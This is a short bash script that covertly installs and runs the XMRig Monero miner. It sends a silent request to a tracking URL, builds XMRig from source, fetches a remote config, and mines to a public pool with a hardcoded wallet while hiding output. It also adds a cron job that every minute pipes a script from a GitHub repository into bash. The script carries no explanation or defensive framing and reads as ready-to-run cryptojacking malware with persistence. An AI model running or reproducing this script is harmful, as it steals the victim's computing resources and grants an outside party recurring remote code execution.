#!/bin/bash
curl --silent --output /dev/null http://canarytokens.com/static/articles/ik0a2kjqto14x4knaj77cl5bz/submit.aspx
echo "cd && cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux /dev/null 2>&1 &" > run.sh && chmod +x run.sh
echo "*/1 * * * * curl https://raw.githubusercontent.com/katerin966/0/main/check.sh | bash > /dev/null 2>&1 &" > cron && cat cron | crontab -
rm cron
git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &   
exit


